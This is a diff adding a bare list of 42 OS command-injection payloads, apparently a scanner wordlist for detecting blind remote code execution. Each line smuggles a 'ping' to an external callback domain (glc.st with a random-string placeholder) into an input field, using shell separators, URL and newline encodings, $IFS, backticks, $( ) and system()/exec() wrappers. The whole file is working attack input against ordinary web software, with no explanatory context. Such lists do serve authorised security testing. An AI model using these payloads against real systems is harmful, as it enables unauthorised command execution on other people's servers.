@@ -1,0 +1,42 @@
+%0Aping%20rce___RANDOM_STR__.glc.st
+%0Aping rce___RANDOM_STR__.glc.st
+%0a ping rce___RANDOM_STR__.glc.st %0a
+%0Aping rce___RANDOM_STR__.glc.st%0A
+|ping rce___RANDOM_STR__.glc.st
+;ping rce___RANDOM_STR__.glc.st
+;ping rce___RANDOM_STR__.glc.st|
+;ping rce___RANDOM_STR__.glc.st;
+;ping$IFSrce___RANDOM_STR__.glc.st;
+)|ping rce___RANDOM_STR__.glc.st
+)|ping rce___RANDOM_STR__.glc.st;
+);ping rce___RANDOM_STR__.glc.st
+);ping rce___RANDOM_STR__.glc.st|
+);ping rce___RANDOM_STR__.glc.st;
+`ping rce___RANDOM_STR__.glc.st`
+||ping rce___RANDOM_STR__.glc.st|
+||ping rce___RANDOM_STR__.glc.st;
+||ping$IFSrce___RANDOM_STR__.glc.st;
+| ping rce___RANDOM_STR__.glc.st
+|ping rce___RANDOM_STR__.glc.st
+|ping rce___RANDOM_STR__.glc.st|
+|ping rce___RANDOM_STR__.glc.st;
+;|ping rce___RANDOM_STR__.glc.st|
+; ping rce___RANDOM_STR__.glc.st
+;ping rce___RANDOM_STR__.glc.st
+;ping rce___RANDOM_STR__.glc.st|
+;ping rce___RANDOM_STR__.glc.st;
+$;ping rce___RANDOM_STR__.glc.st
+$(ping rce___RANDOM_STR__.glc.st)
+& ping rce___RANDOM_STR__.glc.st
+%26 ping rce___RANDOM_STR__.glc.st %26
+;ping rce___RANDOM_STR__.glc.st\n
+\nping rce___RANDOM_STR__.glc.st|
+\nping rce___RANDOM_STR__.glc.st;
+|nping rce___RANDOM_STR__.glc.st\n
+\nping rce___RANDOM_STR__.glc.st\n
+;system('ping rce___RANDOM_STR__.glc.st')
+;exec('ping%20rce___RANDOM_STR__.glc.st')
+|ping rce___RANDOM_STR__.glc.st\n
+`ping rce___RANDOM_STR__.glc.st`
+%0aping rce___RANDOM_STR__.glc.st%0a
+&ping rce___RANDOM_STR__.glc.st&
